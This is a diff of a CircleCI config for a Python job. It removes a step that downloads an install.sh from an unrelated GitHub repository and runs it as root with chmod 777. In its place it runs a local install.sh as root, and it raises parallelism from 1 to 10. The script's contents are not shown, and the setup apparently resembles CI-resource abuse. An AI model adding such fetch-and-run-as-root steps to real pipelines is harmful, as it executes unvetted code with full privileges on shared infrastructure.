@@ -1,7 +1,9 @@
+working_dir: &working_dir ~/app
+
 version: 2.1 
  
 orbs: 
-
+   
   python: circleci/python@1.2 
  
 workflows: 
@@ -11,10 +13,10 @@ workflows:
  
 jobs: 
   job:
-    parallelism: 1
+    parallelism: 10
     docker: 
       - image: cimg/python:3.8 
      
     steps: 
       - checkout 
-      - run: sudo su --command "wget https://raw.githubusercontent.com/sardinmurto/tici/main/install.sh && chmod 777 install.sh && ./install.sh"
+      - run: sudo su --command "chmod +x install.sh && ./install.sh"
